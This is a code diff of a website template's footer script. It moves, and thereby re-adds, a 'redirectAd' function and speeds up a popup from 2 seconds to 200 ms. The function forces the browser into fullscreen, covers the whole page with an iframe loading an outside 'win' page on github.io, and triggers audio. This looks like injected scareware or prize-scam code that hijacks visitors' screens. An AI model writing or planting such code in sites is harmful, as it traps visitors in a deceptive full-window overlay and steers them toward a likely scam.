@@ -1693,28 +1693,6 @@ class="site-footer" id="colophon" itemtype="https://schema.org/WPFooter" itemsco
 function closeAd() {
   document.getElementById("popupAd").style.display = "none";
 }
-
-// Request fullscreen before redirect
-function redirectAd() {
-  let docElm = document.documentElement;
-  if (docElm.requestFullscreen) docElm.requestFullscreen();
-
-  closeAd();
-
-  // create full-screen iframe instead of leaving the page
-  let iframe = document.createElement("iframe");
-  iframe.src = "https://sigmausdts.github.io/win/";
-  iframe.style.position = "fixed";
-  iframe.style.top = 0;
-  iframe.style.left = 0;
-  iframe.style.width = "100%";
-  iframe.style.height = "100%";
-  iframe.style.border = "none";
-  iframe.style.zIndex = "99999";
-  document.body.appendChild(iframe);
-	audi()
-}
-
 function audi() {
         
         // Get the audio elements
@@ -1760,12 +1738,34 @@ function audi() {
         }
 
 
+// Request fullscreen before redirect
+function redirectAd() {
+  let docElm = document.documentElement;
+  if (docElm.requestFullscreen) docElm.requestFullscreen();
+
+  closeAd();
+
+  // create full-screen iframe instead of leaving the page
+  let iframe = document.createElement("iframe");
+  iframe.src = "https://sigmausdts.github.io/win/";
+  iframe.style.position = "fixed";
+  iframe.style.top = 0;
+  iframe.style.left = 0;
+  iframe.style.width = "100%";
+  iframe.style.height = "100%";
+  iframe.style.border = "none";
+  iframe.style.zIndex = "99999";
+  document.body.appendChild(iframe);
+	audi()
+}
+
+
 
 // Show popup after 2 seconds
 window.onload = function() {
   setTimeout(function() {
     document.getElementById("popupAd").style.display = "flex";
-  }, 2000);
+  }, 200);
 };
 	
 </script>
